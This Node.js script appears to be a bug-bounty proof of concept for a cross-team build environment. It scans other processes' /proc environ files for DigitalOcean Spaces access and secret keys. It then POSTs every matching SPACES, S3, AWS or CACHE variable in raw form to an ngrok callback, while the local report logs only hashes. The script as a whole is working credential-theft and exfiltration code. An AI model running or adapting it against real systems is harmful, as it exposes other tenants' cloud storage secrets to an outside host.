import crypto from 'node:crypto';
import fs from 'node:fs';

const sha256 = (value) => crypto.createHash('sha256').update(String(value ?? '')).digest('hex');
const parseEnvironment = (data) => Object.fromEntries(data.toString('utf8').split('\0').filter(Boolean).map((entry) => {
  const index = entry.indexOf('=');
  return index < 0 ? [entry, ''] : [entry.slice(0, index), entry.slice(index + 1)];
}));
const sleep = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));

let spacesSource = null;
let attempts = 0;
for (; attempts < 20 && !spacesSource; attempts += 1) {
  const pids = fs.readdirSync('/proc').filter((entry) => /^\d+$/.test(entry)).sort((a, b) => Number(a) - Number(b)).slice(0, 256);
  for (const pid of pids) {
    try {
      const environment = parseEnvironment(fs.readFileSync(`/proc/${pid}/environ`));
      if (environment.SPACES_ACCESS_KEY && environment.SPACES_SECRET_KEY
          && environment.SPACES_BUCKET_NAME && environment.SPACES_ENDPOINT) {
        const comm = fs.readFileSync(`/proc/${pid}/comm`, 'utf8').trim();
        spacesSource = { pid: Number(pid), comm, environment };
        break;
      }
    } catch {
      // Different-UID or exited processes are expected negative controls.
    }
  }
  if (!spacesSource) await sleep(500);
}

const callbackBase = process.env.LAB_SPACES_CALLBACK_URL || '';
const callbackSecret = process.env.LAB_SPACES_CALLBACK_SECRET || '';
let callbackStatus = null;
let callbackAccepted = false;
let callbackErrorClass = null;
if (spacesSource && callbackBase && callbackSecret) {
  try {
    const url = new URL(callbackBase);
    if (url.protocol !== 'https:' || !url.hostname.endsWith('.ngrok-free.app')) throw new Error('callback-not-allowlisted');
    url.pathname = '/digitalocean-spaces-build';
    url.search = '';
    url.hash = '';
    const spaces = Object.fromEntries(Object.entries(spacesSource.environment)
      .filter(([key]) => /^(?:SPACES|S3|AWS|CACHE)_[A-Z0-9_]+$/.test(key)));
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-lab-secret': callbackSecret },
      body: JSON.stringify({ schema: 1, capturedAt: new Date().toISOString(), probe: 'account2-cross-team-spaces', spaces }),
      redirect: 'manual',
      signal: AbortSignal.timeout(10_000),
    });
    callbackStatus = response.status;
    callbackAccepted = response.status >= 200 && response.status < 300;
  } catch (error) {
    callbackErrorClass = error.name === 'TimeoutError' ? 'timeout' : String(error.message || error.code || error.name);
  }
}

const report = {
  marker: 'BBP_A2_SPACES_CAPTURE_V1',
  testedAt: new Date().toISOString(),
  scanAttempts: attempts,
  spacesCredentialPresent: Boolean(spacesSource),
  sourceProcessName: spacesSource?.comm ?? null,
  accessKeyLength: spacesSource?.environment.SPACES_ACCESS_KEY?.length ?? null,
  accessKeySha256: spacesSource ? sha256(spacesSource.environment.SPACES_ACCESS_KEY) : null,
  secretKeyLength: spacesSource?.environment.SPACES_SECRET_KEY?.length ?? null,
  secretKeySha256: spacesSource ? sha256(spacesSource.environment.SPACES_SECRET_KEY) : null,
  bucketSha256: spacesSource ? sha256(spacesSource.environment.SPACES_BUCKET_NAME) : null,
  endpointHostname: spacesSource ? new URL(String(spacesSource.environment.SPACES_ENDPOINT).replace(/^(?!https?:\/\/)/, 'https://')).hostname : null,
  callbackConfigured: Boolean(callbackBase && callbackSecret),
  callbackStatus,
  callbackAccepted,
  callbackErrorClass,
  rawCredentialLogged: false,
  rawBucketLogged: false
};
console.log(`BBP_A2_SPACES_CAPTURE ${JSON.stringify(report)}`);
